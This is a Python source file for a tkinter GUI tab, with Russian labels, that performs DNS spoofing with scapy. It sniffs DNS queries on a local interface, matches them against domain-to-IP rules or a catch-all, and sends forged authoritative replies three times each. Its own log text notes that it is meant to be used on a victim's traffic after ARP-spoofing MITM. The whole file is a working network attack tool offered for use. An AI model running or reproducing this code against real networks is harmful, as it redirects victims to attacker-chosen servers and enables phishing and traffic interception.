"""DNS spoofing tab."""
import time
import threading
import ipaddress
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox

from scapy.layers.inet import IP, UDP
from scapy.layers.inet6 import IPv6
from scapy.layers.dns import DNS, DNSRR
from scapy.sendrecv import send, sniff

class DnsSpoofTabMixin:
    # -------------------- DNS Spoofing (без изменений) --------------------
    def setup_dns_spoof_tab(self, parent):
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True, padx=8, pady=8)
        left_frame = ttk.Frame(main_frame)
        left_frame.pack(side='left', fill='both', expand=True, padx=5, pady=5)
        right_frame = ttk.Frame(main_frame)
        right_frame.pack(side='right', fill='both', padx=5, pady=5, expand=True)

        params_frame = ttk.LabelFrame(left_frame, text="Параметры DNS Spoofing")
        params_frame.pack(fill='x', padx=5, pady=5)
        row1 = ttk.Frame(params_frame)
        row1.pack(fill='x', padx=5, pady=5)
        ttk.Label(row1, text="Интерфейс:", width=12).pack(side='left', padx=2)
        self.dns_spoof_interface = ttk.Combobox(row1, width=25, font=('Arial', 9), values=self.network_interfaces)
        self.dns_spoof_interface.pack(side='left', padx=2)
        self.dns_spoof_interface.set(self.active_interface)
        row2 = ttk.Frame(params_frame)
        row2.pack(fill='x', padx=5, pady=5)
        ttk.Label(row2, text="TTL (сек):", width=12).pack(side='left', padx=2)
        self.dns_spoof_ttl_entry = ttk.Entry(row2, width=10, font=('Arial', 9))
        self.dns_spoof_ttl_entry.pack(side='left', padx=2)
        self.dns_spoof_ttl_entry.insert(0, "5")
        row3 = ttk.Frame(params_frame)
        row3.pack(fill='x', padx=5, pady=5)
        self.dns_spoof_all_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(row3, text="Подменять все запросы (catch-all)", variable=self.dns_spoof_all_var).pack(anchor='w', padx=5)

        rules_frame = ttk.LabelFrame(left_frame, text="Правила подмены (домен → IP)")
        rules_frame.pack(fill='both', expand=True, padx=5, pady=5)
        columns = ("Домен", "IP адрес")
        self.dns_rules_tree = ttk.Treeview(rules_frame, columns=columns, show='headings', height=8)
        self.dns_rules_tree.heading("Домен", text="Домен (маска *)")
        self.dns_rules_tree.heading("IP адрес", text="Подменять на IP")
        self.dns_rules_tree.column("Домен", width=200)
        self.dns_rules_tree.column("IP адрес", width=150)
        tree_scroll = ttk.Scrollbar(rules_frame, orient="vertical", command=self.dns_rules_tree.yview)
        self.dns_rules_tree.configure(yscrollcommand=tree_scroll.set)
        self.dns_rules_tree.pack(side='left', fill='both', expand=True)
        tree_scroll.pack(side='right', fill='y')
        add_frame = ttk.Frame(rules_frame)
        add_frame.pack(fill='x', pady=5)
        ttk.Label(add_frame, text="Домен:").pack(side='left', padx=2)
        self.dns_rule_domain = ttk.Entry(add_frame, width=20)
        self.dns_rule_domain.pack(side='left', padx=2)
        ttk.Label(add_frame, text="IP:").pack(side='left', padx=2)
        self.dns_rule_ip = ttk.Entry(add_frame, width=15)
        self.dns_rule_ip.pack(side='left', padx=2)
        ttk.Button(add_frame, text="Добавить", command=self.add_dns_rule, width=10).pack(side='left', padx=2)
        ttk.Button(add_frame, text="Удалить", command=self.remove_dns_rule, width=10).pack(side='left', padx=2)

        button_frame = ttk.Frame(params_frame)
        button_frame.pack(fill='x', padx=5, pady=10)
        self.dns_spoof_start_btn = ttk.Button(button_frame, text="Начать DNS Spoofing",
                                             command=self.start_dns_spoof, width=18)
        self.dns_spoof_start_btn.pack(side='left', padx=5)
        self.dns_spoof_stop_btn = ttk.Button(button_frame, text="Остановить",
                                            command=self.stop_dns_spoof, width=15, state='disabled')
        self.dns_spoof_stop_btn.pack(side='left', padx=5)

        stats_frame = ttk.LabelFrame(left_frame, text="Статистика")
        stats_frame.pack(fill='x', padx=5, pady=5)
        stats_grid = ttk.Frame(stats_frame)
        stats_grid.pack(fill='x', padx=5, pady=5)
        ttk.Label(stats_grid, text="Перехвачено запросов:", width=22, anchor='w').grid(row=0, column=0, padx=5, pady=2, sticky='w')
        self.dns_intercepted_label = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.dns_intercepted_label.grid(row=0, column=1, padx=5, pady=2, sticky='w')
        ttk.Label(stats_grid, text="Отправлено подмен:", width=22, anchor='w').grid(row=1, column=0, padx=5, pady=2, sticky='w')
        self.dns_spoofed_label = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.dns_spoofed_label.grid(row=1, column=1, padx=5, pady=2, sticky='w')
        ttk.Label(stats_grid, text="Скорость (spo/s):", width=22, anchor='w').grid(row=2, column=0, padx=5, pady=2, sticky='w')
        self.dns_rate_label = ttk.Label(stats_grid, text="0", width=15, anchor='w')
        self.dns_rate_label.grid(row=2, column=1, padx=5, pady=2, sticky='w')
        ttk.Label(stats_grid, text="Время работы:", width=22, anchor='w').grid(row=3, column=0, padx=5, pady=2, sticky='w')
        self.dns_time_label = ttk.Label(stats_grid, text="00:00:00", width=15, anchor='w')
        self.dns_time_label.grid(row=3, column=1, padx=5, pady=2, sticky='w')

        log_frame = ttk.LabelFrame(right_frame, text="Лог DNS Spoofing")
        log_frame.pack(fill='both', expand=True, padx=5, pady=5)
        self.dns_spoof_log = scrolledtext.ScrolledText(log_frame, height=30, wrap=tk.WORD, font=('Consolas', 8))
        self.dns_spoof_log.pack(fill='both', expand=True, padx=5, pady=5)
        btn_frame = ttk.Frame(log_frame)
        btn_frame.pack(fill='x', padx=5, pady=5)
        ttk.Button(btn_frame, text="Сохранить лог", command=lambda: self.save_log(self.dns_spoof_log), width=14).pack()

    def add_dns_rule(self):
        domain = self.dns_rule_domain.get().strip()
        ip = self.dns_rule_ip.get().strip()
        if not domain or not ip:
            messagebox.showwarning("Ошибка", "Заполните оба поля")
            return
        try:
            ipaddress.ip_address(ip)
        except Exception as e:
            messagebox.showerror("Ошибка", "Неверный IP адрес")
            return
        with self.dns_spoof_lock:
            self.dns_spoof_rules[domain] = ip
        self.dns_rules_tree.insert("", "end", values=(domain, ip))
        self.dns_rule_domain.delete(0, tk.END)
        self.dns_rule_ip.delete(0, tk.END)
        self.dns_spoof_log.insert('end', f"[RULE] Добавлено: {domain} -> {ip}\n")

    def remove_dns_rule(self):
        selected = self.dns_rules_tree.selection()
        if not selected:
            messagebox.showwarning("Предупреждение", "Выберите правило для удаления")
            return
        for item in selected:
            values = self.dns_rules_tree.item(item, 'values')
            domain = values[0]
            with self.dns_spoof_lock:
                if domain in self.dns_spoof_rules:
                    del self.dns_spoof_rules[domain]
            self.dns_rules_tree.delete(item)
            self.dns_spoof_log.insert('end', f"[RULE] Удалено: {domain}\n")

    def start_dns_spoof(self):
        if self.dns_spoof_running:
            return
        try:
            ttl = int(self.dns_spoof_ttl_entry.get())
            if ttl <= 0:
                raise ValueError
            self.dns_spoof_ttl = ttl
        except Exception as e:
            print(f"[Gotcha] error: {e}")
            self.dns_spoof_ttl = 5
            self.dns_spoof_ttl_entry.delete(0, tk.END)
            self.dns_spoof_ttl_entry.insert(0, "5")
        with self.dns_spoof_lock:
            if self.dns_spoof_all_var.get():
                self.dns_spoof_rules["*"] = (
                    self.dns_rule_ip.get().strip() if self.dns_rule_ip.get().strip() else "127.0.0.1"
                )
        if not self.dns_spoof_rules:
            messagebox.showwarning(
                "DNS Spoof", "Нет правил подмены. Добавьте домен→IP или включите catch-all."
            )
            return
        self.dns_spoof_running = True
        self.dns_spoof_start_btn.config(state="disabled")
        self.dns_spoof_stop_btn.config(state="normal")
        self.dns_spoof_stats = {
            "start_time": time.time(),
            "intercepted": 0,
            "spoofed": 0,
            "last_update": time.time(),
            "last_intercepted": 0,
            "last_spoofed": 0,
        }
        # Эффективно только при MITM (ARP spoof) на той же сети
        self.dns_spoof_log.insert(
            "end",
            "[!] DNS spoof видит/влияет на трафик жертвы обычно после ARP Spoofing (MITM).\n",
        )
        self.dns_spoof_thread = threading.Thread(target=self.dns_spoof_worker, daemon=True)
        self.dns_spoof_thread.start()
        self.update_dns_spoof_stats()
        self.dns_spoof_log.insert(
            "end",
            f"DNS Spoofing started on {self.dns_spoof_interface.get()}, TTL={self.dns_spoof_ttl}\n",
        )
        self.dns_spoof_log.insert("end", f"Active rules: {len(self.dns_spoof_rules)}\n")
        self.status_var.set("DNS Spoofing запущен")

    def stop_dns_spoof(self):
        if not self.dns_spoof_running:
            return
        self.dns_spoof_running = False
        if self.dns_spoof_thread and self.dns_spoof_thread.is_alive():
            self.dns_spoof_thread.join(timeout=2.0)
        self.dns_spoof_start_btn.config(state='normal')
        self.dns_spoof_stop_btn.config(state='disabled')
        with self.dns_spoof_lock:
            if self.dns_spoof_all_var.get() and "*" in self.dns_spoof_rules:
                del self.dns_spoof_rules["*"]
        total_time = time.time() - self.dns_spoof_stats['start_time']
        total_intercepted = self.dns_spoof_stats['intercepted']
        total_spoofed = self.dns_spoof_stats['spoofed']
        self.dns_spoof_log.insert('end', "\n--- Results ---\n")
        self.dns_spoof_log.insert('end', f"Intercepted queries: {total_intercepted}\n")
        self.dns_spoof_log.insert('end', f"Spoofed responses: {total_spoofed}\n")
        self.dns_spoof_log.insert('end', f"Duration: {total_time:.2f} sec\n")
        if total_time > 0:
            self.dns_spoof_log.insert('end', f"Avg spoof rate: {int(total_spoofed/total_time)} spo/s\n")
        self.status_var.set("DNS Spoofing остановлен")

    def _dns_log(self, text):
        def _do():
            try:
                self.dns_spoof_log.insert("end", text)
                self.dns_spoof_log.see("end")
            except Exception:
                pass
        try:
            self.root.after(0, _do)
        except Exception:
            pass

    def _dns_match_rule(self, qname):
        """Exact → *.suffix (endswith .suffix) → * catch-all."""
        with self.dns_spoof_lock:
            rules = dict(self.dns_spoof_rules)
        if qname in rules:
            return rules[qname]
        q = qname.lower().rstrip(".")
        for pattern, ip in rules.items():
            if pattern == "*":
                continue
            p = pattern.lower().strip()
            if p.startswith("*."):
                suffix = p[1:]  # ".example.com"
                if q.endswith(suffix):
                    return ip
        if "*" in rules:
            return rules["*"]
        return None

    def dns_spoof_worker(self):
        ttl = int(getattr(self, "dns_spoof_ttl", 5) or 5)

        def handle_dns_packet(packet):
            if not self.dns_spoof_running:
                return True
            # Только UDP DNS (TCP DNS — отдельный протокол, не собираем)
            if UDP not in packet or DNS not in packet:
                return False
            if packet[DNS].qr != 0:
                return False
            if packet[DNS].qd is None:
                return False
            try:
                raw_name = packet[DNS].qd.qname
                if isinstance(raw_name, bytes):
                    qname = raw_name.decode("utf-8", errors="replace").rstrip(".")
                else:
                    qname = str(raw_name).rstrip(".")
            except Exception:
                return False

            spoof_ip = self._dns_match_rule(qname)
            with self.dns_spoof_lock:
                self.dns_spoof_stats["intercepted"] += 1

            if not spoof_ip:
                return False
            try:
                if IPv6 in packet:
                    ip_layer = IPv6(src=packet[IPv6].dst, dst=packet[IPv6].src)
                elif IP in packet:
                    ip_layer = IP(src=packet[IP].dst, dst=packet[IP].src)
                else:
                    return False
                udp_layer = UDP(sport=packet[UDP].dport, dport=packet[UDP].sport)
                dns_response = DNS(
                    id=packet[DNS].id,
                    qr=1,
                    aa=1,
                    ra=0,
                    qd=packet[DNS].qd,
                    an=DNSRR(rrname=packet[DNS].qd.qname, ttl=ttl, rdata=spoof_ip),
                )
                response = ip_layer / udp_layer / dns_response
                iface = self.dns_spoof_interface.get()
                for _ in range(3):
                    send(response, verbose=0, iface=iface)
                    time.sleep(0.001)
                with self.dns_spoof_lock:
                    self.dns_spoof_stats["spoofed"] += 1
                self._dns_log(f"[SPOOF] {qname} -> {spoof_ip} (x3, TTL={ttl})\n")
            except Exception as e:
                self._dns_log(f"[ERROR] {qname}: {e}\n")
            return False

        try:
            sniff(
                iface=self.dns_spoof_interface.get(),
                filter="udp port 53",
                prn=handle_dns_packet,
                stop_filter=lambda x: not self.dns_spoof_running,
                store=0,
            )
        except Exception as e:
            self._dns_log(f"Sniffing error: {e}\n")

    def update_dns_spoof_stats(self):
        if not self.dns_spoof_running:
            return
        current_time = time.time()
        time_diff = current_time - self.dns_spoof_stats['last_update']
        if time_diff >= 1:
            spoofed = self.dns_spoof_stats['spoofed']
            last_spoofed = self.dns_spoof_stats.get('last_spoofed', 0)
            rate = (spoofed - last_spoofed) / time_diff if time_diff > 0 else 0
            self.dns_rate_label.config(text=f"{int(rate)}")
            self.dns_spoof_stats['last_update'] = current_time
            self.dns_spoof_stats['last_spoofed'] = spoofed
        self.dns_intercepted_label.config(text=str(self.dns_spoof_stats['intercepted']))
        self.dns_spoofed_label.config(text=str(self.dns_spoof_stats['spoofed']))
        duration = current_time - self.dns_spoof_stats['start_time']
        hours = int(duration // 3600)
        minutes = int((duration % 3600) // 60)
        seconds = int(duration % 60)
        self.dns_time_label.config(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")
        if self.dns_spoof_running:
            self.root.after(1000, self.update_dns_spoof_stats)

